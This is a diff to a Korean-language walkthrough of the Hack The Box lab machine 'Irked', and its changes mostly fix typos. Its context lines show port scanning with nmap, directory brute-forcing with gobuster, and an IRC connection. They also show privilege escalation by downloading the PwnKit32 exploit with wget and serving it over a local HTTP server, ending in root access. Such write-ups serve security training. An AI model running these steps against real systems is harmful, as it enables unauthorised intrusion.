@@ -2,7 +2,7 @@
 ## target: 10.129.215.108
 
 ## 정보수집
-대상 호스트의 열려있는 포트를 조사하기 위해 nmap을 사용하여 포트스캐닝을 진행행
+대상 호스트의 열려있는 포트를 조사하기 위해 nmap을 사용하여 포트스캐닝을 진행
 ```bash
 #빠르게 전채 포트 스캔
 nmap -Pn -p- -n --open --max-retries 1 --min-rate 2000 $ip
@@ -14,7 +14,7 @@ PORT      STATE SERVICE
 52804/tcp open  unknown
 65534/tcp open  unknown
 
-#열려있는 포트 서비스 버전 확인인
+#열려있는 포트 서비스 버전 확인
 nmap -sV -sC -oA nmap/Irked $ip -p 22,80,111,6697,52804,65534
 
 PORT      STATE SERVICE VERSION
@@ -64,7 +64,7 @@ gobuster dir -u http://10.129.215.108/ -w /usr/share/wordlists/dirb/common.txt -
 /manual               (Status: 301) [Size: 317] [--> http://10.129.215.108/manual/]
 ```
 별다른 경로를 찾지 못했다.
-웹페이지를 보면 irc 서비스가 운영중인걸로 보인다 irc연결 시도도
+웹페이지를 보면 irc 서비스가 운영중인걸로 보인다 irc연결 시도
 ```bash 
 
 sudo apt install irssi
@@ -175,7 +175,7 @@ ircd@irked:/tmp$ uname -a
 Linux irked 3.16.0-6-686-pae #1 SMP Debian 3.16.56-1+deb8u1 (2018-05-08) i686 GNU/Linux
 # 32비트 운영체제
 
-#32 비트운영체제에 맞는 exploit으로 시도도
+#32 비트운영체제에 맞는 exploit으로 시도
 #공격자 kali
 wget https://github.com/ly4k/PwnKit/raw/refs/heads/main/PwnKit32 -O PwnKit32
 python3 -m http.server 7777   
@@ -194,3 +194,4 @@ root@irked:/tmp# cat /root/root.txt
 
 
 ```
+
